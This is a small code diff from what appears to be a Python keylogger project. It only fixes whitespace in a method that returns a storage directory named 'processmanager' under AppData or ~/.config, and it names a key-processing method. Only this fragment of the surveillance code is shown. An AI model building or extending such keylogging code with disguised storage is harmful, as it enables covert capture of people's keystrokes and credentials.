@@ -22,7 +22,7 @@ class KeyLogger:
         """
         if name == "nt":
             return path.join(environ["AppData"], "processmanager")
-        return  path.join(environ["HOME"], ".config", "processmanager")
+        return path.join(environ["HOME"], ".config", "processmanager")
 
     def process_keys(self, key: Listener) -> None:
         """Process characters which are not only alpha-numeric
